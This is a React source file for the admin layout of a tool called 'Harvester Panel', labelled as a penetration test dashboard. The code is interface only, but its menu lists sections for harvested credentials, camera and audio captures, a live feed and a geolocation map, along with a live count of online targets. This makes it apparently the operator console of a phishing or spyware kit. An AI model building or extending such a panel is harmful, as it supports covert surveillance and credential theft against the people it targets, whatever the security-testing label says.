import React, { useState, useEffect } from 'react';
import { Outlet, useNavigate, useLocation } from 'react-router-dom';
import { Box, Drawer, List, ListItemButton, ListItemIcon, ListItemText, AppBar, Toolbar, Typography, IconButton, Chip, Badge, Avatar, Tooltip, Divider } from '@mui/material';
import DashboardIcon from '@mui/icons-material/Dashboard';
import PeopleIcon from '@mui/icons-material/People';
import LockIcon from '@mui/icons-material/Lock';
import CameraAltIcon from '@mui/icons-material/CameraAlt';
import GraphicEqIcon from '@mui/icons-material/GraphicEq';
import LiveTvIcon from '@mui/icons-material/LiveTv';
import MapIcon from '@mui/icons-material/Map';
import NotificationsIcon from '@mui/icons-material/Notifications';
import SettingsIcon from '@mui/icons-material/Settings';
import LogoutIcon from '@mui/icons-material/Logout';
import SecurityIcon from '@mui/icons-material/Security';
import FlashOnIcon from '@mui/icons-material/FlashOn';
import FiberManualRecordIcon from '@mui/icons-material/FiberManualRecord';
import axios from 'axios';

const API_URL = process.env.REACT_APP_API_URL || 'http://localhost:5000';
const DRAWER_WIDTH = 270;

const menuItems = [
  { text: 'Dashboard', icon: <DashboardIcon />, path: '/admin' },
  { text: 'Sessions', icon: <PeopleIcon />, path: '/admin/sessions' },
  { text: 'Credentials', icon: <LockIcon />, path: '/admin/credentials' },
  { text: 'Camera Captures', icon: <CameraAltIcon />, path: '/admin/camera' },
  { text: 'Audio Captures', icon: <GraphicEqIcon />, path: '/admin/audio' },
  { text: 'Live Feed', icon: <LiveTvIcon />, path: '/admin/live-feed' },
  { text: 'Geolocation Map', icon: <MapIcon />, path: '/admin/map' },
  { text: 'Permissions', icon: <FlashOnIcon />, path: '/admin/permissions' },
  { text: 'Alerts', icon: <NotificationsIcon />, path: '/admin/alerts' },
  { text: 'Settings', icon: <SettingsIcon />, path: '/admin/settings' },
];

export default function AdminLayout() {
  const navigate = useNavigate();
  const location = useLocation();
  const [onlineCount, setOnlineCount] = useState(0);
  const [userInfo, setUserInfo] = useState(null);
  const token = localStorage.getItem('admin_token');

  useEffect(() => {
    if (!token) { navigate('/admin/login'); return; }
    axios.defaults.headers.common['Authorization'] = `Bearer ${token}`;

    // Get user info from localStorage
    try {
      const stored = localStorage.getItem('admin_user');
      if (stored) setUserInfo(JSON.parse(stored));
    } catch(e) {}

    // Verify token
    axios.post(`${API_URL}/api/auth/verify`).then(res => {
      setUserInfo(res.data.user);
    }).catch(() => { localStorage.clear(); navigate('/admin/login'); });

    // Poll online count
    const interval = setInterval(async () => {
      try {
        const res = await axios.get(`${API_URL}/api/admin/online-now`);
        setOnlineCount(res.data?.length || 0);
      } catch(e) {}
    }, 5000);
    return () => clearInterval(interval);
  }, [token, navigate]);

  const handleLogout = () => { localStorage.clear(); navigate('/admin/login'); };

  const isActive = (path) => {
    if (path === '/admin') return location.pathname === '/admin';
    return location.pathname.startsWith(path);
  };

  return (
    <Box sx={{ display: 'flex', minHeight: '100vh', bgcolor: '#0a0e17' }}>
      {/* Top Bar */}
      <AppBar position="fixed" sx={{ zIndex: 1201, bgcolor: '#0d1117', borderBottom: '1px solid rgba(255,255,255,0.06)', boxShadow: '0 1px 3px rgba(0,0,0,0.3)' }}>
        <Toolbar>
          <Box sx={{ display: 'flex', alignItems: 'center', gap: 1.5 }}>
            <Box sx={{ bgcolor: '#00f0ff', width: 32, height: 32, borderRadius: 1.5, display: 'flex', alignItems: 'center', justifyContent: 'center' }}>
              <SecurityIcon sx={{ color: '#0a0e17', fontSize: 20 }} />
            </Box>
            <Box>
              <Typography variant="subtitle2" sx={{ color: '#00f0ff', fontWeight: 700, lineHeight: 1.2, fontSize: '0.95rem' }}>
                Harvester Panel
              </Typography>
              <Typography sx={{ color: '#666', fontSize: '0.65rem', lineHeight: 1 }}>
                Penetration Test Dashboard
              </Typography>
            </Box>
          </Box>

          <Box sx={{ flexGrow: 1 }} />

          <Box sx={{ display: 'flex', alignItems: 'center', gap: 1.5 }}>
            <Chip
              icon={<FiberManualRecordIcon sx={{ fontSize: 10, color: onlineCount > 0 ? '#00ff88' : '#666' }} />}
              label={`${onlineCount} online`}
              size="small"
              sx={{
                color: onlineCount > 0 ? '#00ff88' : '#888',
                borderColor: onlineCount > 0 ? 'rgba(0,255,136,0.3)' : 'rgba(255,255,255,0.1)',
                fontWeight: 600,
                fontSize: '0.75rem'
              }}
              variant="outlined"
            />

            {userInfo && (
              <Tooltip title={userInfo.email || ''}>
                <Avatar sx={{ width: 30, height: 30, bgcolor: '#1a1a2e', color: '#00f0ff', border: '1px solid rgba(0,240,255,0.3)', cursor: 'pointer', fontSize: '0.8rem', fontWeight: 700 }}>
                  {(userInfo.fullName || userInfo.email || 'A')[0].toUpperCase()}
                </Avatar>
              </Tooltip>
            )}

            <Tooltip title="Logout">
              <IconButton onClick={handleLogout} size="small" sx={{ color: '#888', '&:hover': { color: '#ff0055' } }}>
                <LogoutIcon sx={{ fontSize: 20 }} />
              </IconButton>
            </Tooltip>
          </Box>
        </Toolbar>
      </AppBar>

      {/* Sidebar */}
      <Drawer
        variant="permanent"
        sx={{
          width: DRAWER_WIDTH,
          '& .MuiDrawer-paper': {
            width: DRAWER_WIDTH,
            bgcolor: '#0d1117',
            borderRight: '1px solid rgba(255,255,255,0.06)',
            mt: '64px',
            pt: 1
          }
        }}
      >
        <List sx={{ px: 1 }}>
          {menuItems.map((item) => {
            const active = isActive(item.path);
            return (
              <ListItemButton
                key={item.text}
                selected={active}
                onClick={() => navigate(item.path)}
                sx={{
                  borderRadius: 2,
                  mb: 0.3,
                  py: 1.2,
                  px: 2,
                  bgcolor: active ? 'rgba(0,240,255,0.08)' : 'transparent',
                  borderLeft: active ? '3px solid #00f0ff' : '3px solid transparent',
                  '&:hover': { bgcolor: active ? 'rgba(0,240,255,0.12)' : 'rgba(255,255,255,0.03)' },
                  transition: 'all 0.15s'
                }}
              >
                <ListItemIcon sx={{ color: active ? '#00f0ff' : '#555', minWidth: 38 }}>
                  {item.icon}
                </ListItemIcon>
                <ListItemText
                  primary={item.text}
                  sx={{
                    '& .MuiListItemText-primary': {
                      color: active ? '#00f0ff' : '#999',
                      fontWeight: active ? 700 : 500,
                      fontSize: '0.88rem',
                      letterSpacing: '0.01em'
                    }
                  }}
                />
                {active && (
                  <Box sx={{ width: 6, height: 6, borderRadius: '50%', bgcolor: '#00f0ff' }} />
                )}
              </ListItemButton>
            );
          })}
        </List>

        <Box sx={{ mt: 'auto', p: 2, borderTop: '1px solid rgba(255,255,255,0.06)' }}>
          <Typography sx={{ color: '#555', fontSize: '0.65rem', textAlign: 'center' }}>
            Harvester v1.0 • Security Assessment Tool
          </Typography>
        </Box>
      </Drawer>

      {/* Main Content */}
      <Box component="main" sx={{ flexGrow: 1, mt: '64px', ml: 0, p: 3, bgcolor: '#0a0e17', minHeight: 'calc(100vh - 64px)' }}>
        <Outlet />
      </Box>
    </Box>
  );
}